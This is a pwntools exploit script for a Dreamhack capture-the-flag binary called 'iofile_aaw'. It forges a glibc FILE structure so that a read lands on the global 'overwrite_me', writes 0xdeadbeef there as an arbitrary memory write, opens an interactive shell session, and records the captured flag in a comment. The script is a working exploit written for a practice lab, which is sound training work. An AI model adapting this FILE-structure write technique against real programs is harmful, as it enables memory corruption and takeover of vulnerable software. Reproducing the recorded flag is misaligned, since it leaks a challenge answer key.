#!/usr/bin/env python3
from pwn import *

exe_path = './iofile_aaw_patched'
HOST = 'host8.dreamhack.games'
PORT = 11459

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *0x000000000040088e
b*0x00000000004008b1
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
fp = FileStructure()
fp.read(exe.sym.overwrite_me, 1024)
fp.flags = 0xFBAD1800
payload = (bytes(fp))[:0x80]
print(fp)
sa(b'Data: ', payload)
payload = p64(0xdeadbeef)
payload = payload.ljust(1024, b'\x00')
sleep(1)
s(payload)
#DH{1d60f1036d33746327c204ddb96e2dc7c79a0fcfbc7206e0716abcbb4a326c3c}
p.interactive()
